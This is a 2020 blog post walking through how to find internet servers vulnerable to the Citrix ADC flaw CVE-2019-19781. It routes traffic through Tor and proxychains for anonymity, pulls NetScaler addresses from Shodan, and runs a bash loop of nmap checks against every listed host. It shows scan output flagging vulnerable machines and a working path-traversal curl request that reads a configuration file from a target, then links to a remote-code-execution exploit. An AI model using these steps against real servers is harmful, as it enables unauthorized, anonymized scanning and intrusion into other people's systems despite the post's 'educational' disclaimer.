<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>How find a vulnerable server on the internet? :: .burso</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="NOTICE: Educational purposes only!
Hi, I want to show you how easy it is to find a vulnerable server on the internet. Okey guys, so now, firstly we need to have some TOR client for anonymity ;) Before we begin, look at the following tools
 tor nyx proxychains-ng shodan curl nmap  $ tor &amp;amp; $ nyx -i 127.0.0.1:9052 Then we can test, if the tor is working correctly with proxychains"/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="/posts/citrix-vulnerability/" />


<link rel="stylesheet" href="/assets/style.css">

  <link rel="stylesheet" href="/assets/green.css">






<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">

<link rel="shortcut icon" href="/favicon.jpg">



<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="How find a vulnerable server on the internet? :: .burso — " />
<meta name="twitter:description" content="NOTICE: Educational purposes only!
Hi, I want to show you how easy it is to find a vulnerable server on the internet. Okey guys, so now, firstly we need to have some TOR client for anonymity ;) Before we begin, look at the following tools
 tor nyx proxychains-ng shodan curl nmap  $ tor &amp;amp; $ nyx -i 127.0.0.1:9052 Then we can test, if the tor is working correctly with proxychains" />
<meta name="twitter:site" content="/" />
<meta name="twitter:creator" content="" />
<meta name="twitter:image" content="">


<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="How find a vulnerable server on the internet? :: .burso — ">
<meta property="og:description" content="NOTICE: Educational purposes only!
Hi, I want to show you how easy it is to find a vulnerable server on the internet. Okey guys, so now, firstly we need to have some TOR client for anonymity ;) Before we begin, look at the following tools
 tor nyx proxychains-ng shodan curl nmap  $ tor &amp;amp; $ nyx -i 127.0.0.1:9052 Then we can test, if the tor is working correctly with proxychains" />
<meta property="og:url" content="/posts/citrix-vulnerability/" />
<meta property="og:site_name" content="How find a vulnerable server on the internet?" />
<meta property="og:image" content="">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta property="article:published_time" content="2020-01-24 12:24:40 &#43;0100 CET" />











</head>
<body class="">


<div class="container center">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    0x90
  </div>
</a>

    </div>
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="/posts/citrix-vulnerability/">How find a vulnerable server on the internet?</a></h1>
  <div class="post-meta">
      
    <span class="post-date">
      2020-01-24
    </span>
    
    
  </div>

  
  <span class="post-tags">
    
    #<a href="/tags/hacking/">hacking</a>&nbsp;
    
    #<a href="/tags/citrix/">citrix</a>&nbsp;
    
    #<a href="/tags/cve-2019-19781/">CVE-2019-19781</a>&nbsp;
    
    #<a href="/tags/tor/">tor</a>&nbsp;
    
    #<a href="/tags/shodan/">shodan</a>&nbsp;
    
    #<a href="/tags/nmap/">nmap</a>&nbsp;
    
  </span>
  

  

  <div class="post-content">
    <p><strong>NOTICE: Educational purposes only!</strong></p>
<p>Hi, I want to show you how easy it is to find a vulnerable server on the internet.
Okey guys, so now, firstly we need to have some TOR client for anonymity ;)
Before we begin, look at the following tools</p>
<ul>
<li><a href="https://www.torproject.org/download/tor/">tor</a></li>
<li><a href="https://nyx.torproject.org/">nyx</a></li>
<li><a href="https://github.com/rofl0r/proxychains-ng">proxychains-ng</a></li>
<li><a href="https://cli.shodan.io/">shodan</a></li>
<li><a href="https://curl.haxx.se/">curl</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ tor &amp;
$ nyx -i 127.0.0.1:9052
</code></pre></div><p>Then we can test, if the tor is working correctly with <strong>proxychains</strong></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ proxychains curl ifconfig.me
<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains.conf
<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/libproxychains4.so
<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> DLL init: proxychains-ng 4.14
<span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> Strict chain  ...  127.0.0.1:9050  ...  ifconfig.me:80  ...  OK
46.166.139.111
</code></pre></div><p>Run shodan to get all open services which look like Citrix ADC Gateway</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ proxychains -q shodan search --fields<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ip_str,port&#34;</span> citrix netscaler &gt; $HOME/citrix_list
</code></pre></div><p>Now we will prepare a script that scans the vulnerability <strong>CVE-2019-19781</strong> in these services</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
CITRIX_IP_LIST<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$HOME<span style="color:#e6db74">/citrix_list&#34;</span>

<span style="color:#66d9ef">while</span> read CITRIX_IP_PORT; <span style="color:#66d9ef">do</span>
          IP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $CITRIX_IP_PORT | awk <span style="color:#e6db74">&#39;{print $1}&#39;</span><span style="color:#66d9ef">)</span>
        PORT<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo $CITRIX_IP_PORT | awk <span style="color:#e6db74">&#39;{print $2}&#39;</span><span style="color:#66d9ef">)</span>
        proxychains -q nmap -p $PORT -sV --script CVE-2019-19781 $IP
<span style="color:#66d9ef">done</span> &lt; $CITRIX_IP_LIST
</code></pre></div><p>After a short moment we get some interesting results. There are still servers with this vulnerability present.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-01-24 15:16 CET                                                                                                                                                                                                
Nmap scan report <span style="color:#66d9ef">for</span> ---.---.---.---                                                                                                                                                                                      
Host is up <span style="color:#f92672">(</span>0.75s latency<span style="color:#f92672">)</span>.                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                               
PORT      STATE SERVICE     VERSION                                                                                                                                                                                                                            
----/tcp open  ssl/unknown                                                                                                                                                                                                                                    
| CVE-2019-19781:                                                                                                                                                                                                                                              
|   VULNERABLE:                                                                                                                                                                                                                                                
|   Remote Code Execution vulnerability in Citrix Application Delivery Controller <span style="color:#f92672">(</span>ADC<span style="color:#f92672">)</span>                                                                                                                                                                        
|     State: VULNERABLE                                                                                                                                                                                                                                        
|     IDs:  CVE:CVE-2019-19781                                                                                                                                                                                                                                 
|     Risk factor: HIGH                                                                                                                                                                                                                                                                                                        
|                   A critical remote code execution vulnerability exists in Citrix Application Delivery Controller <span style="color:#f92672">(</span>ADC<span style="color:#f92672">)</span> CVE-2019-19781.                                                                                                                                                                                                                                                                                                
|                                                                                                                                            
|     Disclosure date: 2019-12-17                                                                                                                                                     
|     References:                                                                                                                            
|       https://support.citrix.com/article/CTX267027                                                                                                           
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2019-19781                                                                                                                                               
                                                                                                                                                                                                                                                                                                                                                                            
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                      
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 152.99 seconds                              

Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-01-24 15:18 CET                                                                                                                                                     
Nmap scan report <span style="color:#66d9ef">for</span> ---.---.---.---
Host is up <span style="color:#f92672">(</span>0.47s latency<span style="color:#f92672">)</span>.                                                                                                                                                           
                                                                                                          
PORT      STATE SERVICE     VERSION                                                                                                                                                   
----/tcp open  ssl/unknown                                                                               
| CVE-2019-19781:                                                                                                                                                                                                                                                                                                                                                                                                                        
|   VULNERABLE:                                                                                           
|   Remote Code Execution vulnerability in Citrix Application Delivery Controller <span style="color:#f92672">(</span>ADC<span style="color:#f92672">)</span>                                                                                                                             
|     State: VULNERABLE                                                                                   
|     IDs:  CVE:CVE-2019-19781                                                                            
|     Risk factor: HIGH                                                                                                                                                                                             
|                   A critical remote code execution vulnerability exists in Citrix Application Delivery Controller <span style="color:#f92672">(</span>ADC<span style="color:#f92672">)</span> CVE-2019-19781.                                                                                                                                                                                                                                                                                                
|                                                                                                                                                                                                                   
|     Disclosure date: 2019-12-17                                                                         
|     References:                                                                                         
|       https://support.citrix.com/article/CTX267027                                                      
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2019-19781                                                                                                                                               

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                      
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 142.11 seconds                                             

Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-01-24 15:21 CET                                                                                                                                                     
Nmap scan report <span style="color:#66d9ef">for</span> ---.---.---.---
Host is up <span style="color:#f92672">(</span>0.53s latency<span style="color:#f92672">)</span>.                                                                               

PORT      STATE SERVICE     VERSION                                                                       
----/tcp open  ssl/unknown                                                                               
| CVE-2019-19781:                                                                                         
|   VULNERABLE:                                                                                           
|   Remote Code Execution vulnerability in Citrix Application Delivery Controller <span style="color:#f92672">(</span>ADC<span style="color:#f92672">)</span>                                                                                                                             
|     State: VULNERABLE                                                                                   
|     IDs:  CVE:CVE-2019-19781                                                                            
|     Risk factor: HIGH                                                                                   
|                   A critical remote code execution vulnerability exists in Citrix Application Delivery Controller <span style="color:#f92672">(</span>ADC<span style="color:#f92672">)</span> CVE-2019-19781.                                                                                                                                                                                                                                                                                                
|                                                                                                         
|     Disclosure date: 2019-12-17                                                                         
|     References:                                                                                         
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#f92672">=</span>CVE-2019-19781                                                                                                                                               
|_      https://support.citrix.com/article/CTX267027                                                      

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                                                      
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 155.56 seconds                                             
</code></pre></div><p>We can verify the vulnerability by using <strong>curl</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ proxychains -q curl -k --path-as-is https://&lt;host&gt;:&lt;port&gt;/vpn/../vpns/cfg/smb.conf  <span style="color:#f92672">&amp;&amp;</span> echo -e
<span style="color:#f92672">[</span>global<span style="color:#f92672">]</span>
        encrypt passwords <span style="color:#f92672">=</span> yes
        name resolve order <span style="color:#f92672">=</span> lmhosts wins host bcast
</code></pre></div><p>And that’s it. :) We will not continue from this point, but there exists a <a href="https://www.exploit-db.com/exploits/47902">RCE exploit</a> that enables the user to gain full control.</p>

  </div>
  
  <div class="pagination">
    <div class="pagination__title">
      <span
        class="pagination__title-h"></span>
      <hr />
    </div>
    <div class="pagination__buttons">
      
      <span class="button previous">
        <a href="/posts/daily-bugle/">
          <span class="button__icon">←</span>
          <span class="button__text">Daily Bugle</span>
        </a>
      </span>
      
      
      <span class="button next">
        <a href="/posts/osce-prologue/">
          <span class="button__text">OSCE Prologue or How to get Secret key to CTP?</span>
          <span class="button__icon">→</span>
        </a>
      </span>
      
    </div>
  </div>
  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="/assets/main.js"></script>
<script src="/assets/prism.js"></script>





  
</div>

</body>
</html>
